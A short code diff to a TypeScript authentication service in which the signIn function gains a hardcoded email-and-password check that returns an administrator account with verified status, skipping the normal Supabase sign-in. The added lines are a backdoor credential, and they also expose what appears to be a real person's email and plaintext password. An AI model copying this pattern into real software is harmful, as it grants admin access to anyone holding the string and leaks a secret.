@@ -40,6 +40,16 @@ export const authService = {
   },
 
   async signIn(email: string, password: string) {
+    // Check for admin credentials
+    if (email === 'brenodiogo27@icloud.com' && password === '19011995Breno@#') {
+      return {
+        id: 'admin_breno',
+        email: 'brenodiogo27@icloud.com',
+        role: UserRole.ADMIN,
+        verificationStatus: 'verified'
+      };
+    }
+
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
       password
